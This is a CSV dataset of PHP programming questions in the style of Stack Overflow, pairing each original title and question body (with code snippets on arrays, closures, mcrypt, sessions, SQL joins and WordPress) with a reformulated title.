originalTitle,body,reformulatedTitle
How to prevent duplicate usernames when people register? PHP/MySQL," I have been making a login/register system and I am drawing close to finishing my register portion of code. The only problem I am running into is how to make it so that users cannot register with duplicated usernames. I want it to work so that my database won't accept the information, and it will tell the user about the error.My PHP <code>  <?phpinclude 'database_connection.php';if (isset($_POST['formsubmitted'])) { $error = array(); //Declare An Array to store any error messageif (empty($_POST['name'])) {//if no name has been supplied $error[] = 'Please Enter a name '; //add to array ""error""} else { $name = $_POST['name']; //else assign it a variable} if (empty($_POST['e-mail'])) { $error[] = 'Please Enter your Email '; } else { if (preg_match(""/^([a-zA-Z0-9])+([a-zA-Z0-9\._-])*@([a-zA-Z0-9_-])+([a-zA-Z0-9\._-]+)+$/"", $_POST['e-mail'])) { //regular expression for email validation $Email = $_POST['e-mail']; } else { $error[] = 'Your EMail Address is invalid '; } } if (empty($_POST['Password'])) { $error[] = 'Please Enter Your Password '; } else { $Password = $_POST['Password']; } if (empty($error)) { //send to Database if there's no error ' }}",How to prevent duplicate usernames when people register?
PHP array square brackets and array() difference," I'm writing a PHP app and I want to make sure it will work with no errors.The original code: Would the following work with no errors or is not recommended for some reason? Are there any difference?I've looked again the data about array() and the short array method with square brackets [] in PHP.net but I'm not sure.And also, is the short php tag <?= ?> fine for echoing? Is there any version issue? (provided is enabled in php.ini) <code>  <?php$data = array('name' => 'test', 'id' => 'theID');echo form_input($data);?> <?= form_input(['name' => 'test', 'id' => 'theID']); ?>",PHP Difference between array() and []
How to use Elastic Search on top of a SQL Database?," I've been reading through a lot of good documentation about how to implement Elastic Search on a website with javascript or PHP.Very good introduction to ES.Very complete documentation here and here.A whole CRUD.Elastic search with PHP: here, here, and here.So the reason why I'm giving you those URLs is to understand how to use one or many of those great documentations when having a pre-existing SQL DB.I'm missing the point somewhere: As they said Elasticsearch will create its own indexes and DB with MongoDB, I don't understand how can I use my (gigantic) database using SQL? Let say I have a MySQL DB, and I would like to use Elasticsearch to make my research faster and to propose the user pre-made queries, how do I do that? How does ES works over/along MySQL? How to transfer this gigantic set of Datas (over 8GB) into ES DB in order to be fully efficient at the beginning?Many Thanks  <code> ",How to use Elastic Search on top of a pre-existing SQL Database?
how to refresh facebook access tocken for server side (in facebook-php SDK)?," I'm using the Facebook PHP SDK to call relevant APIs to post and get data. At present I'm saving a user access token in the database but it expires after 60 days. How can I refresh a user access token? 1 . When do I need to refresh the access tokens? After it expires, or before?2 . What is the best way to refresh access tokens?3 . Should my users need to login again to refresh access token? This is the function that I'm using to extend the access token. but expire time remain same. <code>  public function getExtendedAccessToken($access_token) { $token_url=""https://graph.facebook.com/oauth/access_token""; $params=array('client_id'=>self :: appId,'client_secret'=>self :: appSecretId,'grant_type'=>'fb_exchange_token','fb_exchange_token'=>$access_token); $response = $this->curl($token_url,$params); $response = explode ('=',$response); $response = explode ('&',$response[1]); $response = $response[0]; return $response; }",how to refresh facebook access token for server side (in facebook-php SDK)?
"Declaring PHP anonymous functions outside a loop, any performance gain?"," I have an array which stores multiple references to a single anonymous function: As can be seen, we're creating only one anonymous function.What if we put the function declaration inside of the loop? : Is the engine smart enough to recognize that only one object needs to be created?Does the above code create only one object or does it create one object per iteration?(Question is targeted at both HHVM and Zend Engine.) <code>  $fns = array();//some code$fn = function(){ echo 'this is closure 12345... < 67890'; // etc etc..};for($x=12345; $x<67890; ++$x){ $fns[$x] = $fn;} $fns = array();//some codefor($x=12345; $x<67890; ++$x){ $fns[$x] = function(){ echo 'this is closure 12345... < 67890'; // etc etc.. };}",Does PHP engine optimize anonymous functions within loops?
Should we declare PHP anonymous functions outside a loop?," I have an array which stores multiple references to a single anonymous function: As can be seen, we're creating only one anonymous function.What if we put the function declaration inside of the loop? : Is the engine smart enough to recognize that only one object needs to be created?Does the above code create only one object or does it create one object per iteration?(Question is targeted at both HHVM and Zend Engine.) <code>  $fns = array();//some code$fn = function(){ echo 'this is closure 12345... < 67890'; // etc etc..};for($x=12345; $x<67890; ++$x){ $fns[$x] = $fn;} $fns = array();//some codefor($x=12345; $x<67890; ++$x){ $fns[$x] = function(){ echo 'this is closure 12345... < 67890'; // etc etc.. };}",Does PHP engine optimize anonymous functions within loops?
Is it beneficial to declare PHP anonymous functions outside a loop?," I have an array which stores multiple references to a single anonymous function: As can be seen, we're creating only one anonymous function.What if we put the function declaration inside of the loop? : Is the engine smart enough to recognize that only one object needs to be created?Does the above code create only one object or does it create one object per iteration?(Question is targeted at both HHVM and Zend Engine.) <code>  $fns = array();//some code$fn = function(){ echo 'this is closure 12345... < 67890'; // etc etc..};for($x=12345; $x<67890; ++$x){ $fns[$x] = $fn;} $fns = array();//some codefor($x=12345; $x<67890; ++$x){ $fns[$x] = function(){ echo 'this is closure 12345... < 67890'; // etc etc.. };}",Does PHP engine optimize anonymous functions within loops?
Laravel 4: How to call Filter for needed Resource Controller actions?," I have a resource controller Items: And in action ItemsController@store for creating new item i'm need to activate CSRF filter (and maybe Auth filter) before actions with form. But i can't write it doesn't works. It works when I put this calling in parent Controller's __construct().What I need to do to call some filters directly for resource controller actions? <code>  Route::resource('items', 'ItemsController'); $this->beforeFilter('csrf')",How to call Filter for needed Resource Controller actions?
parse json like markup (but not json)," honestly i don't know what markup is this (i would like to know if this markup have a name). What is easyest way to parse structures like this? i have a lot of them in txt file. <code>  unlockType BirthdayCake { // Don't delete commonName ""Birthday Cake"" autoTag category Item path models/ timedExclusive 1 descSymbol BirthdayCakeDesc dispSymbol BirthdayCakeDisp flairCfg ""Cake/Idle.aaf mat_BirthdayCake< /scale 1.5 /animation Cake/Idle.aaf 0 looping 0.8 /followDist 3.0 /moveSlew 0.0666 /moveVelThresh 10.0 /animEaseTime 1.0 /zOffRobot 2.7 /rotX 20.0 /zSpinDef bone_spinA 80.0"" //OnInspectOrUnlock Menus previewInit Cake/Idle.aaf BirthdayCake< /scale 1.5 /animation Cake/Idle.aaf 0 looping 0.8 /rotSpeed 30 /pos 3.5 0 1 /scaleMult 1.0 property BirthdaySpirit 10}",Parse JSON-like markup
"PHP - performance of foreach, array_map with lambda and array_map with static function"," What's the performance difference (if there is any) between these three approaches, both used to transform an array to another array?Using foreachUsing array_map with lambda/closure functionUsing array_map with 'static' function/methodIs there any other approach?To make myself clear, let's have look at the examples, all doing the same - multiplying the array of numbers by 10: Foreach Map with lambda Map with 'static' function, passed as string reference Is there any other approach? I will be happy to hear actually all differences between the cases from above, and any inputs why one should be used instead of others. <code>  $numbers = range(0, 1000); $result = array();foreach ($numbers as $number) { $result[] = $number * 10;}return $result; return array_map(function($number) { return $number * 10;}, $numbers); function tenTimes($number) { return $number * 10;}return array_map('tenTimes', $numbers);","Performance of foreach, array_map with lambda and array_map with static function"
Why do I get a different result from two identical arithmetic operations?," In the following code, why is the multiplication approach not producing rounding errors, while the cumulative addition approach is? Here's my output: <code>  function get_value() { return 26.82; }function a($quantity) { $value_excluding_vat = get_value(); $value_including_vat = round($value_excluding_vat * (1 + (20 / 100)),2); $total_nett = 0; $total_gross = 0; for($i=0; $i<$quantity; $i++) { $total_nett += $value_excluding_vat; $total_gross += $value_including_vat; } return array( $total_nett, $total_gross );}function b($quantity) { $value_excluding_vat = get_value(); $value_including_vat = round($value_excluding_vat * (1 + (20 / 100)),2); return array( $quantity * $value_excluding_vat, $quantity * $value_including_vat );}$totals = a(1000);print_r($totals);echo $totals[1] - $totals[0];echo ""\n\n"";$totals = b(1000);print_r($totals);echo $totals[1] - $totals[0]; Array( [0] => 26820 [1] => 32180)5360.0000000005Array( [0] => 26820 [1] => 32180)5360",Why do I get a different result from two supposedly analogous arithmetic operations?
Trouble overriding model's save method," I'm trying to override my Post class's save() method so that I can validate some of the fields that will be saved to the record: When I try and run a this method in my unit testing I get the following error: <code>  // User.php<?phpclass Post extends Eloquent{ public function save() { // code before save parent::save(); //code after save }} ..{""error"":{""type"":""ErrorException"",""message"":""Declaration of Post::save() should be compatible with that of Illuminate\\Database\\Eloquent\\Model::save()"",""file"":""\/var\/www\/laravel\/app\/models\/Post.php"",""line"":4}}",Laravel 4 - Trouble overriding model's save method
Is there a forever.js equivalent for php?," I occasionally use forever.js for quick and dirty deploying of CLI type Node.js applications to production environments where I don't want a full on supervisord deployment.I was wondering if there was an equivalent for PHP? At the moment we have a queue processing system that get's messages from SQS and processes them synchronously into a database (it can't be done async as that causes all sorts of nasty row locking issues in this particular use case.) At the moment it runs ever minute using cron, but it often finishes early and I want it to start running again. I can't have more than one process running at a time.Any *nix command/software/bash type ideas are welcome. <code> ",Is there a forever.js equivalent for PHP to run my scripts continuously?
Overloading a private method in PHP," I know I cannot overload methods in PHP. And, as far as I know, private methods in a class are invisible to classes that extend the base class. So why this does not work? The error:PHP Strict Standards: Declaration of Child::foo() should be compatible with Base::foo($arg) in /var/www/boludo.php on line 17I assumed that foo($arg) method is invisible in Child class because is private. So, I'm not overloading foo, I'm just creating a method called foo. <code>  class Base { private function foo($arg) { print ""Base $arg""; }}class Child extends Base { public function foo() { print ""Child""; }}$c = new Child;print $c->foo();","""Overloading"" a private method in PHP"
Amazon DynamoDB InvalidSignatureException," From this code I'm getting the error below I'm getting the following error when trying to add a table into AWS's DynamoDB. So far I've:Checked to see if Authentication Key and Secret Key were correct, they were.Updated cURLWhen I put false authentication permissions in, the error didn't change. <code>  require ""vendor/autoload.php"";use Aws\Common\Aws;use Aws\DynamoDb\DynamoDbClient;use Aws\DynamoDb\Enum\ComparisonOperator;use Aws\DynamoDb\Enum\KeyType;use Aws\DynamoDb\Enum\Type;$aws = Aws::factory(array('key' => '[clipped]','secret' => '[clipped]','region' => Region::US_WEST_1));$client = $aws->get(""dynamodb"");$tableName = ""ExampleTable"";$result = $client->createTable(array( ""TableName"" => $tableName, ""AttributeDefinitions"" => array( array( ""AttributeName"" => ""Id"", ""AttributeType"" => Type::NUMBER ) ), ""KeySchema"" => array( array( ""AttributeName"" => ""Id"", ""KeyType"" => KeyType::HASH ) ), ""ProvisionedThroughput"" => array( ""ReadCapacityUnits"" => 5, ""WriteCapacityUnits"" => 6 )));print_r($result->getPath('TableDescription')); PHP Fatal error: Uncaught Aws\\DynamoDb\\Exception\\DynamoDbException: AWS Error Code:InvalidSignatureException, Status Code: 400, AWS Request ID: [clipped], AWS Error Type: client, AWS Error Message: Signature expired: 20130818T021159Z is now earlier than 20130818T021432Z (20130818T022932Z - 15 min.), User-Agent: aws-sdk-php2/2.4.3 Guzzle/3.7.2 curl/7.21.6 PHP/5.3.6-13ubuntu3.9\n thrown in/var/www/vendor/aws/aws-sdk-php/src/Aws/Common/Exception/NamespaceExceptionFactory.php online 91",InvalidSignatureException: Signature expired: [timestamp] is now earlier than [timestamp]
How To Develop A Database Schema For A Tree Structure," I'm using below tree structure and planning to develop a db schema for the below.What I have development up to now is below,The problem I'm having is if I search for Y, below tree should be generated.Logic I'm using is, Y has two cross references X,Z, those two nodes should be in the diagram and the parent nodes all the way to the starting parent node.Given that I'm using PHP to generate this tree using a mysql db table as shown above. DB structure can be changed. I searched on google for a similar tree structure but I couldn't find any help.NoteI'm not asking for you to write code for me. All I'm asking is some guidelines how this should be done.I found below helpful but still different to my scenarioWhat is the most efficient/elegant way to parse a flat table into a tree?How to represent a tree like structure in a dbIf anyone can please tell me what php libraries should I use to generate the tree and what's the suitable db structure to be used? <code> ",How To Develop A Database Schema For A Tree Structure(Directed acyclic graph)
MySQL comma seperated values," I currently have a sql and php problem where I use this statement to get everything from services as well as its associated tables: But in the zone table I join, there are comma separated values '1,2' and after creating an associative array where I group the services to their zones a singular service only goes to a singular zone, instead of when the value in the table is '1,2' it should be in both zones... I have a feeling it's because of 'zone.name AS zone', because then it only returns one name and if I say 'zone AS zone' it return comma separated numbers...Here's how I sort the array: and I display it by: Any help is greatly appreciated.The Services table looks like:And the Zones Table: <code>  $db = $this->getDbo();$query = $db->getQuery(true);// Select the required fields from the table.$query->select( $this->getState( 'list.select', 'a.*' ));$query->from('`#__services_service` AS a');$query->where(""a.zone"");$query->select('zone.name AS zone, zone.description AS zone_description, zone.price AS zone_price, zone.interval_recommended AS interval_recommended');$query->join('LEFT', '#__services_zones AS zone ON zone.id = a.zone');$query->select('category.icon AS category');$query->join('LEFT', '#__services_categories AS category ON category.id = a.category'); foreach( $this->items as $item ){if( !isset( $zones[ $item->zone ] ) )$zone_items[ $item->zone] = array();$zone_items[ $item->zone ][] = $item; $zones[$item->zone] = array( 'zone' => $item->zone, 'zone_interval' => $item->interval_recommended, 'zone_description' => $item->zone_description, 'zone_price' => $item->zone_price, 'items' => $zone_items[$item->zone] );} <?php foreach( $zones as $zone): ?> <div class=""row-fluid zones-page""> <div class=""row-fluid zone-title-block""> <div class=""span4 zone-name""><h1><?php echo $zone['zone']; ?></h1></div> <div class=""span7 zone-description""> <?php echo $zone['zone_description']; ?> <?php if($zone['zone_interval'] == 1): ?> <span class=""interval pull-right"">Interval Recommended</span> <?php endif; ?> </div> </div> <?php foreach( $zone['items'] as $items ) :?> <div class=""row-fluid zone-services-contain""> <div class=""span1""><div class=""zone-icon""><?php //echo $items->category; ?></div></div> <div class=""span11 zone-services""> <h4><?php echo $items->name; ?></h4> <div><?php echo $items->description; ?></div> </div> </div> <?php endforeach; ?> <div class=""row-fluid zone-amount""> only <div><?php echo 'R' . $zone['zone_price']; ?></div> </div> </div> <div class=""bicycle-divider""> <div class=""bicycle-icon""></div> </div><?php endforeach; ?>",MySQL comma separated values
php redirection using header," My web structure is Nav Link || iFrame I'm Trying to handle session timeout, when session has timeout I'm trying to redirect page to login page, this works fine(session timeout).Problem:When I'm redirecting the page,login page is displayed in iFrame, which is not expected.How can I redirect to login page(whole window),rather than opeing it in iFrame.I Tried:1. using header2. using javascript(Commented) Please guide me for this issue. Thanks! <code>  Header-of-page Footer <?php session_start();$timeout = 1; // Set timeout minutes$timeout = $timeout * 60; // Converts minutes to secondsif (isset($_SESSION['timeout'])) { $session_life = time() - $_SESSION['timeout']; if ($session_life > $timeout) { session_destroy(); header(""Location: login.php?msg=timeout""); // echo '<script language=""javascript"">'; // echo 'window.location.replace(""login.php"");'; // echo '</script>'; }}$_SESSION['timeout'] = time();?>",PHP redirection using header
Why does ajax post data need to be uri encoded?," Regarding this line: I don't understand why this is being URI encoded. Later data will be sent via ajax POST. I understand that URLs, particularly the one you can see in the browser address bar require special characters as described here:http://www.blooberry.com/indexdot/html/topics/urlencoding.htmBut what exactly does this have to do with Ajax posting?Do both the url address bar and the internal ajax post utilize the same mechanism? <code>  var data = encodeURIComponent(JSON.stringify(object_literal));",Does ajax post data need to be URI encoded?
MySQL | PHP - Looped queries or join," I'm having an inner debate at my company about looping queries in this matter: Instead of using an sql join like this: Additional information about this, the database is huge, millions of rows.I have of course searched an answer to this question, but nobody can answer this in a a good way and with a lot of up votes that makes me certain that one way is better then the other.QuestionCan somebody explain to me why one of thees methods is better then the other one? <code>  $sql = "" SELECT foreign_key FROM t1"";foreach(fetchAll($sql) as $row){ $sub_sql = "" SELECT * FROM t2 WHERE t2.id = "" . $row['foreign_key']; foreach(fetchAll($sub_sql) as $sub_row) { // ... }} $sql = "" SELECT t2.* FROM t2 JOIN t1 ON t1.foreign_key = t2.id"";foreach(fetchAll($sql) as $row){ // ...}",MySQL query in a loop vs using a SQL join
MySQL query in a loop vs using a SQL join," I'm having an inner debate at my company about looping queries in this matter: Instead of using an sql join like this: Additional information about this, the database is huge, millions of rows.I have of course searched an answer to this question, but nobody can answer this in a a good way and with a lot of up votes that makes me certain that one way is better then the other.QuestionCan somebody explain to me why one of thees methods is better then the other one? <code>  $sql = "" SELECT foreign_key FROM t1"";foreach(fetchAll($sql) as $row){ $sub_sql = "" SELECT * FROM t2 WHERE t2.id = "" . $row['foreign_key']; foreach(fetchAll($sub_sql) as $sub_row) { // ... }} $sql = "" SELECT t2.* FROM t2 JOIN t1 ON t1.foreign_key = t2.id"";foreach(fetchAll($sql) as $row){ // ...}",MySQL query in a loop vs using a SQL join
"PHP -- Comma Separated List from Array with ""and"" Before Last Element"," I have an array ($number_list) that has a dynamically generated list of values. There will be at least 1 value in the array and no more than 4.Currently, I have a nice way of having a comma separated list using this... However, I'd like to keep with English convention and have the word ""and"" before the last element. So, let's say $number_list contains the values 4, 5, 6, 7. I would want to echo a statement like, ""The list is 4, 5, 6, and 7.""Any ideas how to get that and in there? <code>  $comma_list = implode(', ', $number_list);","Comma separated list from array with ""and"" before last element"
what is php foreach with key => value mean," I have a database call and I'm trying to figure out what the $key => $value does in a foreach loop. The reason I ask is because both these codes output the same thing, so I'm trying to understand why it's written this way. Here's the code:1)In foreach use $key => $value this outputs the same as:2)In foreach use only $value So my question is, what is the difference between $key => $value or just $value in the foreach loop. The array is multidimensional if that makes a difference, I just want to know why to pass $key to $value in the foreach loop. <code>  foreach($featured as $key => $value){ echo $value['name'];} foreach($featured as $value) { echo $value['name'];}","Difference between ""as $key => $value"" and ""as $value"" in PHP foreach"
convert stdClass to array empty," I have a problem to convert an object stdClass to array.I have tried in this way: or or The array before the cast is full with one record, after my try to cast it is empty.How to cast / convert it without delete its rows?array before cast: after cast is empty NULL if I try to make a var_dump($booking);I have also tried this function but always empty: <code>  return (array) $booking; return (array) json_decode($booking,true); return (array) json_decode($booking); array(1) { [0]=> object(stdClass)#23 (36) { [""id""]=> string(1) ""2"" [""name""]=> string(0) """" [""code""]=> string(5) ""56/13"" } } public function objectToArray($d) { if (is_object($d)) { // Gets the properties of the given object // with get_object_vars function $d = get_object_vars($d); } if (is_array($d)) { /* * Return array converted to object * Using __FUNCTION__ (Magic constant) * for recursive call */ return array_map(__FUNCTION__, $d); } else { // Return array return $d; } }",php stdClass to array
convert stdClass to array," I have a problem to convert an object stdClass to array.I have tried in this way: or or The array before the cast is full with one record, after my try to cast it is empty.How to cast / convert it without delete its rows?array before cast: after cast is empty NULL if I try to make a var_dump($booking);I have also tried this function but always empty: <code>  return (array) $booking; return (array) json_decode($booking,true); return (array) json_decode($booking); array(1) { [0]=> object(stdClass)#23 (36) { [""id""]=> string(1) ""2"" [""name""]=> string(0) """" [""code""]=> string(5) ""56/13"" } } public function objectToArray($d) { if (is_object($d)) { // Gets the properties of the given object // with get_object_vars function $d = get_object_vars($d); } if (is_array($d)) { /* * Return array converted to object * Using __FUNCTION__ (Magic constant) * for recursive call */ return array_map(__FUNCTION__, $d); } else { // Return array return $d; } }",php stdClass to array
Call php function itself," I just want to make sure I do it right and this will not create any conficts.I have a function which calls itself and need your approval if it's OK or not to do so? This is the array: And here is the final init: The result is just how I wanted to be, it works great, but I don't know if this is a good practice. <code>  <?phpfunction determine($the_array){ foreach ($the_array as $key => $value) { switch ($key) { case 'in': echo $value; break; case 'out': echo $value; break; case 'level': echo '<ul>'; determine($value); echo '</ul>'; break; } }} $the_array = array( 'in' => '<li>Simple IN</li>', 'out' => '<li>Simple OUT</li>', 'level' => array( 'in' => '<li>Simple IN 2</li>', 'out' => '<li>Simple OUT 2</li>', 'level' => array( 'in' => '<li>Simple IN 3</li>', 'out' => '<li>Simple OUT 3</li>' ), ),); echo '<ul>';determine($the_array);echo '</ul>';",Recursive function: Call php function itself
Why encrypted string given by Mcrypt js library and PHP is different?," I have been trying to implement mcrypt encryption/ decryption technique on both server end, PHP and client end. I am trying to use mcrypt.js library at the moment as: I have used these following private vars at the mcrypt.js library. As I commented above, why is it enc_str not equal as $enc_str and why is it mcrypt.Decrypt('<?php echo $enc_str ?>', '') not equal as string_decrypt($enc_str, $key) ?Updated question:I tried both base64 encode/ decode and even hex2bin/ bin2hex to parse those strings but these two produced following results:Using Hex2bin/ Bin2hexPHP result: JS result: Using Base64 encode/ decode:PHP result: JS result: And on both cases, UTf-8 content can not be decrypted on JS end.*Links: *Mcrypt JS libraryBase64 JS library <code>  <?php $key = 'testtesttesttesttesttesttesttest';function string_encrypt($string, $key) { $crypted_text = mcrypt_encrypt( MCRYPT_RIJNDAEL_128, $key, $string, MCRYPT_MODE_ECB ); return base64_encode($crypted_text);}function string_decrypt($encrypted_string, $key) { $decrypted_text = mcrypt_decrypt( MCRYPT_RIJNDAEL_128, $key, base64_decode($encrypted_string), MCRYPT_MODE_ECB ); return trim($decrypted_text);}echo 'Provided Text: '.$test_str = 'This is test message.';echo '<br />';echo 'Encyrpted Value: '.$enc_str = string_encrypt($test_str, $key); echo '<br />';echo 'Decrypted Value: '.string_decrypt($enc_str, $key); echo '<br />';?><script src='rijndael.js'></script><script src='mcrypt.js'></script><script src='base64v1_0.js'></script><script lang='javascript'> var enc_str = mcrypt.Encrypt('<?php echo $test_str ?>',''); enc_str = B64.encode(enc_str); alert(enc_str); // I don't get this same as encypted PHP text. i.e. $enc_str var dec_str = B64.decode('<?php echo $enc_str ?>'); alert(mcrypt.Decrypt(dec_str,'')); // I don't get this same as decypted PHP text. // i.e. string_decrypt($enc_str)</script> var cMode='ecb'; var cCipher='rijndael-256'; var cKey='testtesttesttesttesttesttesttest'; //I am providing the same key Provided Text: This is test message.Encyrpted Value: a51e970427ec8f666a5684cc1712ad03b29889cc10f4ccbf55733564d11c0386Decrypted Value: This is test message. Provided Text:This is test message.Mcrypted value:'fjVUs5dEncyrpted Value:a51e970427ec8f666a5684cc1712ad03b29889cc10f4ccbf55733564d11c0386After Hex to Bin Text:'fjVUs5dDecrypted Value:This is test message./*These diamond with question mark is produced while decypting the value.*/ Provided Text: This is test message.Mcrypt encrypted value : 'fjVUs5d/* Here mcrypted value provided by JS and PHP is different That is causing to produce different value at two ends*/Encyrpted Value: pR6XBCfsj2ZqVoTMFxKtA7KYicwQ9My/VXM1ZNEcA4Y=Decrypted Value: This is test message. Provided Text:This is test message.Mcrypted value:'fjVUs5dEncyrpted Value:wqUewpcEJ8Oswo9malbChMOMFxLCrQPCssKYwonDjBDDtMOMwr9VczVkw5EcA8KGAfter Base64 Decode:'fjVUs5dDecrypted Value:This is test message.bFaF+J!",Mcrypt js encryption value is different than that produced by PHP mcrypt / Mcrypt JS decrypt doesn't work for UTF-8 chars
Mcrypt js encryption value is different than that produced by PHP mcrypt," I have been trying to implement mcrypt encryption/ decryption technique on both server end, PHP and client end. I am trying to use mcrypt.js library at the moment as: I have used these following private vars at the mcrypt.js library. As I commented above, why is it enc_str not equal as $enc_str and why is it mcrypt.Decrypt('<?php echo $enc_str ?>', '') not equal as string_decrypt($enc_str, $key) ?Updated question:I tried both base64 encode/ decode and even hex2bin/ bin2hex to parse those strings but these two produced following results:Using Hex2bin/ Bin2hexPHP result: JS result: Using Base64 encode/ decode:PHP result: JS result: And on both cases, UTf-8 content can not be decrypted on JS end.*Links: *Mcrypt JS libraryBase64 JS library <code>  <?php $key = 'testtesttesttesttesttesttesttest';function string_encrypt($string, $key) { $crypted_text = mcrypt_encrypt( MCRYPT_RIJNDAEL_128, $key, $string, MCRYPT_MODE_ECB ); return base64_encode($crypted_text);}function string_decrypt($encrypted_string, $key) { $decrypted_text = mcrypt_decrypt( MCRYPT_RIJNDAEL_128, $key, base64_decode($encrypted_string), MCRYPT_MODE_ECB ); return trim($decrypted_text);}echo 'Provided Text: '.$test_str = 'This is test message.';echo '<br />';echo 'Encyrpted Value: '.$enc_str = string_encrypt($test_str, $key); echo '<br />';echo 'Decrypted Value: '.string_decrypt($enc_str, $key); echo '<br />';?><script src='rijndael.js'></script><script src='mcrypt.js'></script><script src='base64v1_0.js'></script><script lang='javascript'> var enc_str = mcrypt.Encrypt('<?php echo $test_str ?>',''); enc_str = B64.encode(enc_str); alert(enc_str); // I don't get this same as encypted PHP text. i.e. $enc_str var dec_str = B64.decode('<?php echo $enc_str ?>'); alert(mcrypt.Decrypt(dec_str,'')); // I don't get this same as decypted PHP text. // i.e. string_decrypt($enc_str)</script> var cMode='ecb'; var cCipher='rijndael-256'; var cKey='testtesttesttesttesttesttesttest'; //I am providing the same key Provided Text: This is test message.Encyrpted Value: a51e970427ec8f666a5684cc1712ad03b29889cc10f4ccbf55733564d11c0386Decrypted Value: This is test message. Provided Text:This is test message.Mcrypted value:'fjVUs5dEncyrpted Value:a51e970427ec8f666a5684cc1712ad03b29889cc10f4ccbf55733564d11c0386After Hex to Bin Text:'fjVUs5dDecrypted Value:This is test message./*These diamond with question mark is produced while decypting the value.*/ Provided Text: This is test message.Mcrypt encrypted value : 'fjVUs5d/* Here mcrypted value provided by JS and PHP is different That is causing to produce different value at two ends*/Encyrpted Value: pR6XBCfsj2ZqVoTMFxKtA7KYicwQ9My/VXM1ZNEcA4Y=Decrypted Value: This is test message. Provided Text:This is test message.Mcrypted value:'fjVUs5dEncyrpted Value:wqUewpcEJ8Oswo9malbChMOMFxLCrQPCssKYwonDjBDDtMOMwr9VczVkw5EcA8KGAfter Base64 Decode:'fjVUs5dDecrypted Value:This is test message.bFaF+J!",Mcrypt js encryption value is different than that produced by PHP mcrypt / Mcrypt JS decrypt doesn't work for UTF-8 chars
Insert PHP code In Wordpress Page and Post," I want to know the visitor country using PHP and display it in on a WordPress Page. But when I add PHP code to a WordPress page or post it gives me an error.How can we add PHP code on WordPress pages and posts? <code>  <?PHP try { function visitor_country() { $client = @$_SERVER['HTTP_CLIENT_IP']; $forward = @$_SERVER['HTTP_X_FORWARDED_FOR']; $remote = $_SERVER['REMOTE_ADDR']; $result = ""Unknown""; if(filter_var($client, FILTER_VALIDATE_IP)) { $ip = $client; } elseif(filter_var($forward, FILTER_VALIDATE_IP)) { $ip = $forward; } else { $ip = $remote; } $ip_data = @json_decode(file_get_contents(""http://www.geoplugin.net/json.gp?ip="" . $ip)); if($ip_data && $ip_data->geoplugin_countryName != null) { $result = array('ip' => $ip, 'continentCode' => $ip_data->geoplugin_continentCode, 'countryCode' => $ip_data->geoplugin_countryCode, 'countryName' => $ip_data->geoplugin_countryName, ); } return $result; } $visitor_details = visitor_country(); // Output Country name [Ex: United States] $country = $visitor_details['countryName'];",Insert PHP code In WordPress Page and Post
Add php variable inside echo statement as href link address?," I'm trying to use a PHP variable to add a href value for a link in an echo statement.Here's a simplified version of the code I want to use. I know that I can't just add the variable into the echo statement, but I can't seem to find an example anywhere that works. <code>  $link_address = '#';echo '<a href=""$link_address"">Link</a>';",Add PHP variable inside echo statement as href link address?
show loading image while php is executing," I would like to show loading image while the php script is executing. I have read different answers on how to do that but most of them stated that I should have a separate php page. However I am using single page to show the rows, so how can I be able to show loading image?Example of select query, I am using to fetch the data: <code>  $stmt = $mydb->prepare(""select * from table where firstname = ? and id = ? ""); $stmt->bind_param('ss', $firstname, $id); $stmt->execute(); $stmt->close();",Show loading image while PHP is executing
Where the heck is any Selenium 2 documentation?," I'm having a frustrating time trying to find any information on Selenium 2 for PHPUnit except for source code and tests that I can ""look through"" to ""figure it out"". Everyone's favorite seems to behttps://github.com/sebastianbergmann/phpunit-selenium/blob/master/Tests/Selenium2TestCaseTest.php...but surely I don't have to dig through hundreds of lines of source to get answers to simple questions? Where can I find a beginner's guide, basic documentation, or anything?  <code> ",Where the heck is any Selenium 2 documentation for PHPUnit?
Browser will not display images - PHP," It would be great if someone could help me figure out why the browser cannot load the images (error 404). The code works, and the image source is correct, but I cannot figure out what is wrong. (using localhost)  <code>  $dir = '/home/user/Pictures';$file_display = array( 'jpg', 'jpeg', 'png', 'gif');if (file_exists($dir) == false) { echo 'Directory \'', $dir, '\' not found!';} else { $dir_contents = scandir($dir); foreach ($dir_contents as $file) { $file_type = strtolower(end(explode('.', $file))); if ($file !== '.' && $file !== '..' && in_array($file_type, $file_display) == true) { echo '<img src=""', $dir, '/', $file, '"" alt=""', $file, '"" />'; } }}",How to display images from a folder using php - PHP
